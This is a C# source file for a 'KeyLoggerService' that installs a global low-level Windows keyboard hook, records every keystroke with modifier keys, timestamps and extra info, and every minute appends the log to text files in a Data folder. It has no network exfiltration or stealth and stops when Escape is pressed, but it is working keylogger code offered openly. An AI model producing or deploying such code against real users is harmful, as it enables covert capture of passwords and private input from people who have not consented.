using System.Runtime.InteropServices;
using System.Diagnostics;
using KeyLoggerService.HookSetting;
using System.Data;
using System.Text;
using System.Windows.Forms;

namespace KeyLoggerService.HookSetting.HookManager
{
    public class KeyHookSet
    {

        #region Ket Log Data

        private static DateTime _setDataInFileTime = DateTime.Now;
        private static List<(string, DateTime,nint,int)> hookValue = [];

        #endregion

        public static IntPtr _hookId = IntPtr.Zero;
        public IntPtr _hookMoudle = IntPtr.Zero;

        private static NativeMethods.HookProc _proc = HookCallback;


        public const int WH_KEYBOARD_LL = 13;
        public const int WM_KEYDOWN = 0x0100;

        [StructLayout(LayoutKind.Sequential)]
        public struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr dwExtraInfo;
        }


        #region Hook Set
        public Task Start()
        {
            bool res = true;
            while (res)
            {
                using (var curProcess = Process.GetCurrentProcess())
                using (var curModule = curProcess.MainModule!)
                {
                    _hookMoudle = NativeMethods.GetModuleHandle(curModule.ModuleName);
                    _hookId = NativeMethods.SetWindowsHookEx(13, HookCallback, _hookMoudle, 0);
                    if (_hookId != IntPtr.Zero)
                    {
                        res = false;
                    }
                }

                File.AppendAllText(
                    Path.Combine(Directory.GetCurrentDirectory(), "Data", "HookSetLog.txt"), // Path
                         $"Hook Set In {DateTime.Now} is {(_hookId == IntPtr.Zero ? "FAILED" : "SUCCESS")} \n"); //Data

                System.Console.WriteLine($"Hook Set In {DateTime.Now} is {(_hookId == IntPtr.Zero ? "FAILED" : "SUCCESS")} ");
            }
            return Task.CompletedTask;
        }

        #endregion

        #region ShutDown Hook 
        public Task ShutdownHook()
        {
            return ShutdownHook(_hookId);
        }
        public Task ShutdownHook(nint hookId)
        {
            if (hookId != nint.Zero)
            {
                bool res = true;
                while (res)
                {
                    res = !NativeMethods.UnhookWindowsHookEx(hookId);
                }
            }
            return Task.CompletedTask;
        }

        #endregion

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                var hookStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                string key = GetKeyCombination(hookStruct);
                
                hookValue.Add((key.ToString(), DateTime.Now,hookStruct.dwExtraInfo,hookStruct.vkCode));
                System.Console.WriteLine(key.ToString());


                if (DateTime.Now >= _setDataInFileTime.AddMinutes(1))
                {
                    SetDataInFile();
                    _setDataInFileTime = DateTime.Now;
                    hookValue = [];
                }

                if (key == "Escape")
                {
                    Console.WriteLine(" stopppppppppppppppppppppppp");
                    Application.Exit();
                }
            }
            return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private static void SetDataInFile()
        {
            string data = "";

            string ProjDirectory
             = Directory.GetCurrentDirectory();


            // JustKey 

            foreach (var item in hookValue)
            {
                data += item.Item1.ToString();
            }
            WriteInFile(Path.Combine(ProjDirectory, "Data", "JustKey.txt"), data);


            // Fulldata
            data = " ------------- new Line ----------------- \n";

            foreach (var item in hookValue)
            {
                data +=
                $@"{item.Item1.ToString()}          {item.Item2.ToString()}          {item.Item3.ToString()}          {item.Item4.ToString()}" + "\n";
            }

            WriteInFile(Path.Combine(ProjDirectory, "Data", "Fulldata.txt"), data);
            data = "";
            System.Console.WriteLine("Set Data In Files --- ");
        }

        private static void WriteInFile(string filePath, string data)
        {
            _ = File.AppendAllTextAsync(filePath, data, Encoding.UTF8);
        }


        private static string GetKeyCombination(KBDLLHOOKSTRUCT hookStruct)
        {
            Keys key = (Keys)hookStruct.vkCode;

            bool ctrl = (NativeMethods.GetAsyncKeyState(0x11) & 0x8000) != 0;   // VK_CONTROL
            bool shift = (NativeMethods.GetAsyncKeyState(0x10) & 0x8000) != 0;  // VK_SHIFT
            bool alt = (NativeMethods.GetAsyncKeyState(0x12) & 0x8000) != 0;    // VK_MENU (Alt)

            string combo = "";

            if (ctrl) combo += "Ctrl + ";
            if (alt) combo += "Alt + ";
            if (shift) combo += "Shift + ";

            combo += key.ToString();

            return combo;
        }
    }
}